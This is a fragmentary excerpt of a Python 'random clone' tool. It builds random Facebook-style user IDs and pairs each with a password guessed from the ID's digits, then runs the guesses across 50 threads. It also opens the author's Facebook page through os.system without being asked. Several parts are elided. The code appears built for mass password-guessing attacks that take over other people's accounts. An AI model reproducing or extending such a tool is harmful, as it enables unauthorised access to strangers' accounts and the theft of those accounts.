...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/nazmul122004?mibextid=ZbWKwL/')
logo = ("""
\33[1;92m    █   █  ███  █████ █   █ █   █ █
\33[1;92m    ██  █ █   █    █  ██ ██ █   █ █
\33[1;92m    █ █ █ █████   █   █ █ █ █   █ █
...
\33[1;92m [✓] TOLL        : FREE
\33[1;92m [✓] WORKING     : DATA\WIFI
\33[1;92m [✓] TOOL        : RANDOM CLONE         \033[1;91mV.0.3 """)
def linex():
	print('\33[1;92m============================================')
loop = 0
oks = []
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(' \r\r\33[1;31•\033[1;91m                 I Need Gf🥲😇')
        print(f" \33[1;92m============================================ ")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
